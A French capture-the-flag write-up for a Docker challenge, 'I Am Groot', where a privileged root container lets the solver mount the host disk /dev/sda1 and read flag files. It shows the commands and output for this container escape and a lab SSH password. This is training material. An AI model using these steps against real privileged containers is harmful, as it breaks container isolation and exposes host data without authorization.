# DOCKER - I Am Groot

### 15 points

### Énoncé:

L’un des administrateurs système déploie une machine docker en root et avec des privilèges, il vous dit que ce n’est pas important car, tant que c’est dans le container, c’est sécurisé :)

Démarrez le CTF-ATD "I am groot"
Connectez-vous en SSH sur le docker de la machine port 2222 (root / arq87TNDCf9NfksD)
Le mot de passe de validation du challenge est dans le fichier .passwd
Le mot de passe de validation du CTF-ATD est dans le fichier /passwd


# Résolution

```
➜  IAmGroot: ssh root@[ip] -p 2222
````
```
root@h3yd0ck3r:~# lsblk

NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT

sda      8:0    0   20G  0 disk 

├─sda1   8:1    0   19G  0 part /etc/hosts

├─sda2   8:2    0    1K  0 part 

└─sda5   8:5    0  975M  0 part [SWAP]
```
ou alors

```
root@h3yd0ck3r:~# mount

proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)

tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)

devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,
mode=620,ptmxmode=666)

sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)

cgroup on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime)

mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)

shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)

/dev/sda1 on /etc/hosts type ext4 (rw,relatime,discard)

devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
```
---
```
root@h3yd0ck3r:~# mkdir -p /mnt/random

root@h3yd0ck3r:~# mount /dev/sda1 /mnt/random

root@h3yd0ck3r:~# cd /mnt/random
```
---
```
root@h3yd0ck3r:~# cat passwd

[flag pour le ctf daily]


root@h3yd0ck3r:~# cat .passwd

[flag pour le challenge]
```